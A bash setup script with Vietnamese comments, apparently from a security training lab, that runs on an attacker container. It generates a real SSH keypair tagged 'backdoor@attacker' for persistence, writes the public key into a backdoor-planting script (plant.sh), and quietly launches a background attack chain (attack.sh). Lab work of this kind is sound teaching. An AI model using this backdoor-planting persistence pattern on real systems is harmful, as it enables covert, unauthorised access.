#!/bin/bash
# Chay LAN DAU tren container attacker (an).
# Bai 17: sinh CAP KHOA SSH THAT cho persistence (giai doan 5 cai, giai doan 6 dung de quay lai).
# plant.sh goc chua 1 chuoi khoa gia -> thay dong BK_KEY bang khoa cong khai vua sinh
# (giu comment 'backdoor@attacker' de prestop goc van nhan ra). Logic plant.sh KHONG doi.
mkdir -p /home/ubuntu/.ssh && chmod 700 /home/ubuntu/.ssh
[ -f /home/ubuntu/.ssh/bk ] || ssh-keygen -q -t ed25519 -N '' -C 'backdoor@attacker' -f /home/ubuntu/.ssh/bk
PUB=$(cat /home/ubuntu/.ssh/bk.pub)
sed -i "s|^BK_KEY=.*|BK_KEY=\"$PUB\"|" /home/ubuntu/plant.sh
# Khoi dong chuoi tan cong ngam (1 lan; stop/start lab khong chay lai neu da xong)
if [ ! -f /home/ubuntu/.chain_done ]; then
  setsid bash /home/ubuntu/attack.sh >/home/ubuntu/attack.log 2>&1 < /dev/null &
fi
exit 0
